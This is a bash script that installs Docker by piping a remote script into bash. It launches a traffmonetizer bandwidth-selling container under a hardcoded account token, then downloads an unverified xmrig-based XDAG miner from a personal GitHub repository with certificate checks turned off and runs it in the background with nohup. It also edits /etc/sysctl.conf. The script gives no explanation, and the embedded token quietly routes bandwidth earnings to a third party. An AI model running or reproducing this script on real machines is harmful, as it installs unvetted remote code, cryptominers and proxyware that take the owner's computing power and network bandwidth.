#!/bin/bash

apt update -y
curl -s -L https://get.docker.com | LC_ALL=en_US.UTF-8 bash
docker run -d --restart=always --name tm traffmonetizer/cli_v2 start accept --token yuaO2TrzloMnrfCbq4Qsm8a4krGACxGZw+R82fYKUzQ=


WALLET=$1
solo=$2
port=23656
if [ "$solo" == "solo" ]; then
  port=23655
fi

wget -O $HOME/xmrig-4-xdag --no-check-certificate -N "https://raw.githubusercontent.com/brook8023/myproxy/main/xdag/xmrig-4-xdag"
wget -O $HOME/config.json --no-check-certificate -N "https://raw.githubusercontent.com/brook8023/myproxy/main/xdag/config.json"


sed -i 's/"url": *"[^"]*",/"url": "stratum.xdag.org:'$port'",/' $HOME/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "test",/' $HOME/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/xmrig.log'",#' $HOME/config.json

(grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((1168+$(nproc)))" | tee -a /etc/sysctl.conf)) && sysctl -w vm.nr_hugepages=$((1168+$(nproc)))

chmod +x $HOME/xmrig-4-xdag
nohup $HOME/xmrig-4-xdag --config=$HOME/config.json &